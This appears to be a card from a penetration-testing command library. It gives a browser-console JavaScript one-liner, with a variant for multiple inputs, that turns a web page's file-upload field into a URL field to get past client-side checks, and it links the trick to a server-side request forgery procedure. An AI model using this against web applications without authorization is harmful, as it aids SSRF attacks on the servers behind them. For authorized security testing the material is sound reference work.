---
id: b2b71c98-bcab-4077-8fbd-607585858d0a
name: change-file-input-type-to-url
type: command
executor: javascript
data: 'document.querySelector(''input[type=file]'').type = ''url'';'
output: null
created_at: '2023-04-06T03:56:37.686984+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Web
tags:
  - ssrf
  - bypass
verified: true
validated: true
---

# change-file-input-type-to-url

## Command

```javascript
document.querySelector('input[type=file]').type = 'url';
```

## Description

This JavaScript command modifies an HTML file input element to accept URLs instead of local files, enabling URL-based uploads in vulnerable web applications. Execute in the browser console on the upload page to bypass client-side restrictions.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `input[type=file]` | CSS selector for the target file input element | Yes |

## Examples

### Basic Usage

```javascript
document.querySelector('input[type=file]').type = 'url';
```

### Advanced Usage (Multiple Inputs)

```javascript
document.querySelectorAll('input[type=file]').forEach(input => input.type = 'url');
```

## Expected Output

The input field transforms into a text input without errors in the console. Verify by inspecting the element: <input type="url">. If no matching element, console error: "Cannot set property 'type' of null".

## Related

- [[procedures/SSRF-Image-Upload-Bypass-Using-Type-URL]]
